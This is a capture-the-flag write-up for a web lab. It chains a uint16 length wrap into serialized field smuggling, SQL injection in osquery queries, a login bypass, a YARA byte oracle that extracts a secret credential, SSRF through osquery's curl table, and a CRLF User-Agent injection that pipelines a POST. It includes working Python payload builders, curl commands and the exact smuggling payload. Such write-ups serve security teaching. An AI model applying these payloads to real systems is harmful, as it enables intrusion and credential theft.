+++
title = 'Player | ctfroom.com Lab'
date = '2026-08-08T16:00:00-04:00'
draft = false
slug = 'player-ctfroom'
description = 'Chaining a uint16 length truncation into field smuggling, SQL injection, arbitrary osquery table access, a YARA oracle for credential recovery, and SSRF to reach an internal flag server.'
tags = ["Web", "CTF", "SSRF", "SQLi", "Hard"]
+++

The challenge gives us a small Go webapp at `https://605893355ff7.labs.ctfroom.com` and a `Player.zip` with the full source of two Go services (`app` and `flagserver`). Flag format is `africc{}`. The end goal is to make the app POST the content of `/opt/vault/credentials.dat` to the internal `flagserver:5001`, which returns the flag.

Let's goo and explore.

## Recon - Reading the Source

The first thing that stands out in `app/main.go` is a hand-rolled serialization scheme:

```go
func serializeBuffer(f1, f2, f3 []byte) []byte {
	var buf bytes.Buffer

	packField := func(data []byte) {
		length := uint16(len(data))
		binary.Write(&buf, binary.BigEndian, length)
		buf.Write(data)
	}

	packField(f1)
	packField(f2)
	packField(f3)

	return buf.Bytes()
}
```

Each field is written as `[2-byte big-endian length][data]`. Three fields in a row. The deserializer on the other side reads them back the same way:

```go
func deserializeBuffer(buf []byte) (f1, f2, f3 []byte, err error) {
	reader := bytes.NewReader(buf)
	unpackField := func() ([]byte, error) {
		var length uint16
		if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
			return nil, err
		}
		data := make([]byte, length)
		if _, err := io.ReadFull(reader, data); err != nil {
			return nil, err
		}
		return data, nil
	}
	...
}
```

**Key finding #1:** `serializeBuffer` wraps the length in a `uint16`, but the raw bytes are written after it regardless of truncation. `deserializeBuffer` reads the **wrapped** length but skips forward through the actual data. If a field is longer than `65535` bytes, the length wraps small but the full data still lands in the buffer — so the parser ends up reading the *start of the next field* as its length and *the middle of the stream* as the data. That's our **field smuggling** primitive: we can make the backend believe field 2 and field 3 contain attacker-controlled values.

**Key finding #2:** The backend query is built with raw `fmt.Sprintf` and only the *value* is quote-filtered:

```go
valueStr := string(valueBytes)

if strings.Contains(valueStr, "'") {
	http.Error(w, "no SQLi", http.StatusBadRequest)
	return
}

var query string
if string(table) == "users" {
	query = fmt.Sprintf(
		"SELECT * FROM %s WHERE %s='%s' and directory like '/home/%%';",
		table, parameter, valueStr,
	)
} else {
	query = fmt.Sprintf(
		"SELECT * FROM %s WHERE %s='%s';",
		table, parameter, valueStr,
	)
}

out, err = exec.Command(
	"osqueryi", "--json",
	"--enable_tables="+strings.Join(allowedTables, ","),
	query,
).Output()
```

`parameter` and `table` are never validated, and the value goes inside single quotes without escaping. The allowed tables list is the interesting part:

```go
var allowedTables = []string{
	"users",
	"file",
	"curl",
	"yara",
	"interface_addresses",
	"etc_hosts",
}
```

So the backend runs **osquery** — the endpoint is `POST /query` on the internal `127.0.0.1:5000` service, reachable from the front app on `:8000`.

**Key finding #3:** If the query returns any rows and the table is `users`, the app prints `OK` and issues a session cookie — we don't need a real password. Just make the query return a row.

## Building the Smuggling Payload

The front `loginHandler` posts `Handle` from the login form into the backend:

```go
username := r.Form.Get("Handle")
serialized := serializeBuffer([]byte(username), []byte("username"), []byte("users"))
resp, err := http.PostForm(backendURL(), map[string][]string{
	"serialized": {string(serialized)},
})
```

So field 1 is the username (attacker-controlled, and it's the **value** that gets quote-checked), field 2 is the hardcoded `username`, field 3 is the hardcoded `users`.

We want to control field 2 (parameter) and field 3 (table). The truncation trick: give field 1 a giant blob so the `uint16` length wraps. With `len(f1) = 65537`, the stored length is `1` (65537 mod 65536). The deserializer then:

1. reads field 1 as length `1` → takes 1 byte (the first byte of our blob),
2. reads field 2's length from the **rest of our blob**, which we control,
3. reads field 3's length from whatever follows.

So our buffer layout is:

```txt
[V] [f1=1 byte] [2-byte len][parameter] [2-byte len][table] [padding to 65537+]
```

The backend ends up with `valueStr = "V"`, `parameter = our injection`, `table = our table`.

The query becomes, e.g.:

```sql
SELECT * FROM users WHERE 1=1--'V' and directory like '/home/%';
```

The `--` comments out the rest, the login check just needs the query to return a row.

## Login Bypass

I wrote a tiny builder for these payloads:

```python
import struct, sys

def pack_field(data: bytes) -> bytes:
    return struct.pack(">H", len(data)) + data

def build(parameter: bytes, table: bytes, value_len: int = 1) -> bytes:
    value = b"V" * value_len
    body = value + pack_field(parameter) + pack_field(table)
    total = 65536 + value_len
    body += b"A" * (total - len(body))
    return body

payload = build(b"1=1--", b"users")
open("login.bin", "wb").write(payload)
```

Then send it through the login form:

```bash
curl -sk https://605893355ff7.labs.ctfroom.com/login \
  --data-urlencode "Handle@login.bin" -i
```

Result:

```http
HTTP/2 302
Location: /
Set-Cookie: session=9c0d27259f63cb7e2b178bc17036581f099f39bb05d1cca13e342844fbe38355
```

**We are logged in.** And here's the important part: `/filesMetadata` takes a `q` parameter, serializes it into the `file` table query:

```go
filename := r.Form.Get("q")
serialized := serializeBuffer([]byte(filename), []byte("path"), []byte("file"))
```

Same smuggling applies — `q` is field 1, but we control the whole serialized buffer anyway since we can inject into field 2 and 3. The only catch is the single-quote filter on the value. Since the injection goes into `parameter`/`table` (unfiltered), we're fine.

## Arbitrary osquery Access

With the session cookie, hitting `/filesMetadata` with a smuggled payload lets us run any allowed osquery table:

```bash
curl -sk https://605893355ff7.labs.ctfroom.com/filesMetadata \
  -b "session=9c0d27..." \
  --data-urlencode "q@q1.bin"
```

Querying the `file` table for the vault credential:

```txt
type: regular size: 64 uid: 0 mode: 0400 path: /opt/vault/credentials.dat
```

- size **64** bytes → matches `entrypoint.sh`, which generates `tr -dc 'a-f0-9' < /dev/urandom | head -c 64`
- mode **0400** → we can't read it as a normal query result, but the app runs as root, so osquery itself can read it.

I also dumped `etc_hosts` and `interface_addresses` for the network picture:

```txt
/etc/hosts -> elk.ctfroom.cool api.ctfroom.com  259d05395ebd  10.100.85.2
interface_addresses -> eth0 10.100.85.2
```

Now: the file is 64 hex chars and we have `yara` and `curl` tables enabled. That's the whole plan:
- `yara` → read the file content byte-by-byte (oracle),
- `curl` → SSRF to reach the internal flag server (GET-only, so the POST stays the open problem).

## YARA Oracle for the Credential

The idea: use the `yara` osquery table with a `sigrule` that matches a single byte at a specific offset. Query:

```sql
SELECT * FROM yara
WHERE path='/opt/vault/credentials.dat' AND sigrule='rule r { strings: $a = { 61 } condition: $a at 0 }--';
```

**Problem I hit:** the `yara` table returns a row for the scanned file *even when nothing matches*. My first version treated "non-empty response" as a match — so every candidate "matched" and the oracle returned `00000000...` (all zeros). The real discriminator is the `matches` / `count` columns: a matched rule gives `count: 1 matches: r`, a no-match gives `count: 0 matches:` with an empty value.

So the oracle is:

```python
def yara_hit(byte_hex: int, offset: int) -> bool:
    rule = f"rule r {{ strings: $a = {{ {byte_hex:02x} }} condition: $a at {offset} }}"
    param = f"path='/opt/vault/credentials.dat' AND sigrule='{rule}'--"
    body = query(param, b"yara")
    return "count: 1" in body and "matches: r" in body
```

Then loop offsets `0..63` against the candidate alphabet `0-9a-f`:

```python
cred = ""
for i in range(64):
    for c in "0123456789abcdef":
        if yara_hit(ord(c), i):
            cred += c
            break
print(f"[*] credential: {cred}")
```

Each test is one HTTP request, `64 * 16 = 1024` requests total. `a-f0-9` and `count: 1` confirm the first byte is not `0` — the file is genuinely random hex.

## SSRF to the Flag Server

Why is there an SSRF at all? Look at the network layout in `docker-compose.yml`:

```yaml
services:
  app:
    ports: ["${HOST_PORT:-8000}:8000"]
    networks: [edge, flagnet]
  flagserver:
    expose: ["5001"]
    networks: [flagnet]

networks:
  flagnet:
    internal: true
```

- `flagserver` is on `flagnet` **only**, and `flagnet` is `internal: true` — no route to the outside world.
- Port `5001` is `expose`d (reachable by other `flagnet` containers), never mapped to the host.

So from my machine the flag server does not exist. But `osqueryi` runs **inside the app container**, which is on `flagnet` — so an HTTP request made by `osqueryi` *can* reach `flagserver:5001`. That's the SSRF: I can't fetch the internal host, but I can make a server-side process fetch it for me, because the smuggling primitive lets me control the `url` in a query against the `curl` table.

The flag server's `submitHandler` is the target:

```go
func submitHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		fmt.Fprintln(w, "vault attestation endpoint. POST the credential material to receive the flag.")
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	submitted := []byte(strings.TrimSpace(string(body)))
	ok, err := credentialAccepted(submitted) // POSTs to app:5002/verify
	...
	fmt.Fprintf(w, "%s\n", flag)
}
```

GET `/` → that message. POST with the credential as the body → the flag.

Let's try the SSRF first — GET is allowed, and it proves we can reach the internal host. Build a payload with `table = "curl"` and `parameter = "url='http://flagserver:5001/'"`:

```sql
SELECT * FROM curl WHERE url='http://flagserver:5001/';
```

Response:

```txt
url: http://flagserver:5001/ user_agent: osquery method: GET response_code: 200
result: vault attestation endpoint. POST the credential material to receive the flag.
```

`response_code: 200` from an internal-only host = SSRF confirmed. It also reaches the app's own loopback services — the `:5002` verify endpoint answered `405 Method Not Allowed` to our GET.

**Problem I hit:** the flag needs a **POST** with the credential as the body, but this osquery (the `5.12.1` package the Dockerfile installs) is **GET-only**. How did I prove that?

**1. Column existence test.** osquery errors out on a column that doesn't exist:

```txt
WHERE url='http://flagserver:5001/' AND body='<cred>'--
→ Failed to run osqueryi: exit status 1
```

No `body`, no `data` — there is no request-body column at all.

**2. Method discriminator test.** The app's own attestation service `http://127.0.0.1:5002/verify` answers differently per verb: `405` to GET, `403` to POST with the wrong body, `200 ok` to POST with the correct credential. A perfect probe:

```txt
url='http://127.0.0.1:5002/verify' AND method='GET'
→ response_code: 405  result: Method Not Allowed  method: GET
```

The `405` proves a real GET left the container. Now:

```txt
url='http://127.0.0.1:5002/verify' AND method='POST'
→ (empty)
```

If the table could POST, verify would answer `403` and the emitted row would carry `method: POST` — which matches the `WHERE method='POST'` filter, so we'd see a row. We see nothing, which tells us two things at once: the request that actually went out was a GET (hence the `405`), and the emitted row says `method: GET` (hence the filter dropped it).

**3. Body-carrier test.** I stuffed the credential into every existing column as a potential request body (`user_agent`, `result`, `bytes`, `round_trip_time`) with `method='POST'` against the verify endpoint. Any one of them being a real body source would produce `200 ok`. All came back empty.

The white-box reason, straight from osquery 5.12.1's `curl.cpp`:

```cpp
r["method"] = "GET";              // the emitted row always says GET
response = client.get(request);   // ...because it always GETs
```

So: the SSRF gets me to `flagserver:5001`, but only with a verb the flag server won't answer with a flag. I have the credential and I can reach the internal host — the missing piece is a POST. The curl table can't POST... but it does let me control the `User-Agent` header.

## HTTP Request Smuggling for the POST

osquery sets the request's `User-Agent` from our `user_agent` constraint, and boost::beast writes that value **verbatim — CRLF and all**. From `curl.cpp`:

```cpp
request << http::Request::Header("User-Agent", r["user_agent"]);
```

So I can inject raw HTTP bytes into the request. If I terminate the GET's headers early and pipe in a second `POST / HTTP/1.1` carrying the credential, flagserver's Go server parses it as the next request on the same (pipelined) connection.

**Problem I hit:** my first attempt injected `\r\n\r\nPOST / HTTP/1.1...` directly into `user_agent`, and the response was:

```txt
response_code: 400   result: 400 Bad Request: missing required Host header
```

The error revealed the header order. `http_client.cpp` sets `Host` in `initHTTPRequest`, which runs *after* curl.cpp added `User-Agent` — so beast serializes `User-Agent` **before** `Host`:

```txt
GET / HTTP/1.1\r\n
User-Agent: <value>\r\n
Host: flagserver:5001\r\n      <- written last
\r\n
```

My `\r\n\r\n` ended the first request's headers *before* beast wrote its own `Host` line, so Go rejected the request. The fix: inject a valid `Host:` line into the value before the blank line:

```txt
User-Agent: X\r\n
Host: flagserver:5001\r\n        <- injected — first request is now valid
\r\n                              <- end of first request headers
POST / HTTP/1.1\r\n              <- pipelined second request
Host: flagserver:5001\r\n
Content-Length: 64\r\n
Connection: close\r\n
\r\n
ecc5e8e22468c5c92728ddd62a5e3f60afe7074ece8e1f9ebaca777ef5856630   <- 64-byte body
\r\nHost: flagserver:5001\r\n\r\n  <- beast's trailing Host (harmless garbage)
```

The exact payload:

```python
smuggle = (
    "X\r\n"
    "Host: flagserver:5001\r\n"
    "\r\n"
    "POST / HTTP/1.1\r\n"
    "Host: flagserver:5001\r\n"
    "Content-Length: 64\r\n"
    "Connection: close\r\n"
    "\r\n" + CRED
)
param = f"url='http://flagserver:5001/' AND user_agent='{smuggle}'--".encode()
```

What happens server-side:

1. Go parses request 1 (`GET /`) → **200** `vault attestation...` — the row shows `response_code: 200, bytes: 78`.
2. Go loops and parses the buffered `POST /` → `submitHandler` reads the 64-byte body, verifies it via `app:5002/verify`, then `unlock(submitted)` sets `claimPath = /<sha256(cred)>` with a 2-minute window.
3. We never need the smuggled POST's response — we just need it *processed*. So a normal curl-table GET to the claim path claims the flag:

```txt
url='http://flagserver:5001/835626e1b96276bbff79cd7957ab9987e6aab6dc1212fc2682f2c3904b202c93'
→ response_code: 200  result: africc{wh4t_4_gr34t_marathon}
```

**Flag: `africc{wh4t_4_gr34t_marathon}`**

## Final Chain

```txt
uint16 length wrap
        │
        ▼
serialized field smuggling  ──►  control parameter + table
        │
        ▼
SQL injection in osquery query  ──►  login bypass + arbitrary table access
        │
        ▼
file table  ──►  locate /opt/vault/credentials.dat (64 bytes, mode 0400)
        │
        ▼
yara table oracle  ──►  recover all 64 hex chars (count: 1 = match)
        │
        ▼
curl table SSRF  ──►  reach flagserver:5001 (GET-only)
        │
        ▼
User-Agent CRLF injection  ──►  pipelined POST with credential  ──►  unlock
        │
        ▼
GET /sha256(cred)  ──►  claim  ──►  africc{wh4t_4_gr34t_marathon}
```

## Problems Noticed

1. **uint16 truncation**: `uint16(len(data))` silently wraps for fields > 65535 bytes, but the full data is still serialized — parser and writer disagree about field boundaries.
2. **Only the value is quote-checked**: `parameter` and `table` go straight into the SQL string, so all injection lives there and the `'` filter is useless.
3. **yara table returns rows on no-match**: the "does it return anything" heuristic is a trap; you must inspect `matches`/`count`.
4. **osquery curl table is GET-only**: `WHERE method='POST'` never matches (the emitted row always says `GET`) and there is no body column — proven by the column-existence test (`exit 1`), the `verify` method-discriminator (`405` vs empty), and the body-carrier test.
5. **User-Agent is written verbatim**: osquery passes our `user_agent` straight into a beast header, CRLF and all — that's the smuggling vector that turns the GET into a pipelined POST.
6. **Header order matters**: `User-Agent` is serialized before `Host` (Host is added later in `initHTTPRequest`), so the injected blank line must come after an injected `Host:` or the first request dies with `400 missing required Host header`.
7. The value field is quote-filtered, but it's still inside the quotes — you can't put quotes in the value, but you never need to.

The core lesson: **the length prefix and the actual bytes diverge, and any deserializer that trusts a length to bound a read of data it already committed to writing is a smuggling primitive.** From there, a whitelisted-but-powerful osquery surface plus an unvalidated SQL template is all it takes.
-----
